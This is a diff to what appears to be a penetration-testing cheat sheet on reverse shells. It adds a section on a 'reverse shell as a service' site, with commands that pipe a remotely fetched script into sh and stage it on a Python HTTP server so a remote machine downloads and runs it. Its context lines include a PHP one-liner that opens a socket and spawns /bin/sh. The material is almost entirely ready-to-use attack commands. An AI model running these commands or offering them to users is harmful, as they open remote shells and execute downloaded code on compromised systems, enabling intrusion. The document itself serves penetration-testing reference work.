@@ -122,6 +122,30 @@ php -r '\$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'
 ```
 
 
+### Reverse Shell as a Service
+
+This website generates a `bash` script with multiple reverse shell.
+It detects available tools and runs with the correct payload.
+
+
+```bash
+curl https://resh.now.sh/{IP}:{PORT} | sh
+```
+
+You can also copy the script locally and expose to the server using a Python
+HTTP server:
+
+```bash
+# On your machine
+cd www
+curl https://resh.now.sh/{IP}:{PORT} > x
+python -m http.server
+
+# On the remote machine
+curl http://{IP}/x | sh
+```
+
+
 ## Forward shell
 
 If the remote server cannot contact your local machine, it's still possible to
